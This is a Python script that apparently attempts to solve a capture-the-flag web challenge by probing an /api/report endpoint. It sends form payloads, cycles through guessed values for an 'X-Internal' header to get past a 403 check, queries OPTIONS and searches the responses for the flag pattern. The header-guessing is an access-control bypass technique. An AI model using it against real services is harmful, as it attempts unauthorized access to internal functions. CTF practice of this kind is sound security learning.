#!/usr/bin/env python3
"""Test API with different header combinations"""
import requests
import re

BASE_URL = "https://ghost-p.vishwactf.com"

def test_api_without_internal_header():
    """Test if API works without X-Internal header but with specific payload"""
    print("[*] Testing API without X-Internal header...")
    
    # Maybe it needs form data instead of JSON
    payloads_form = [
        {"message": "test"},
        {"content": "test"},
        {"report": "test"},
    ]
    
    for payload in payloads_form:
        try:
            r = requests.post(f"{BASE_URL}/api/report", data=payload, timeout=5)
            if r.status_code != 403:
                print(f"[+] Form data {payload}: Status {r.status_code}")
                print(f"    Response: {r.text[:300]}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def test_different_internal_values():
    """Test different values for X-Internal header"""
    print("\n[*] Testing different X-Internal header values...")
    
    values = [
        "1",
        "yes",
        "True",
        "TRUE",
        "internal",
        "admin",
        "secret",
        "staging",
    ]
    
    payload = {"message": "test"}
    
    for value in values:
        try:
            headers = {
                "X-Internal": value,
                "Content-Type": "application/json"
            }
            r = requests.post(f"{BASE_URL}/api/report", json=payload, headers=headers, timeout=5)
            if r.status_code != 400 and r.status_code != 403:
                print(f"[+] X-Internal={value}: Status {r.status_code}")
                print(f"    Response: {r.text[:300]}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def check_options_method():
    """Check OPTIONS method for API hints"""
    print("\n[*] Checking OPTIONS method...")
    
    try:
        r = requests.options(f"{BASE_URL}/api/report", timeout=5)
        print(f"[+] Status: {r.status_code}")
        print(f"[+] Headers: {dict(r.headers)}")
        print(f"[+] Response: {r.text}")
        
        if "vishwaCTF{" in r.text:
            flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
            print(f"[!] FLAG: {flags[0]}")
            return flags[0]
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    print("="*60)
    print("API Variations Test")
    print("="*60)
    
    test_api_without_internal_header()
    test_different_internal_values()
    check_options_method()

if __name__ == "__main__":
    main()
